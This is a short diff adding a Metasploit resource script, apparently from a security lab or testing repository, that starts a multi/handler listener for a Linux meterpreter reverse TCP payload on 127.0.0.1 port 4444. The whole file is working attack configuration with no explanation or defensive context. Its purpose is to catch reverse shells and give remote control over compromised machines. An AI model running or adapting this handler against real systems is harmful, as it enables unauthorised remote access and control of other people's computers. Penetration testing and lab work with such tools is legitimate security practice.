@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set PAYLOAD linux/x86/meterpreter_reverse_tcp
+set LHOST 127.0.0.1
+set LPORT 4444
+run
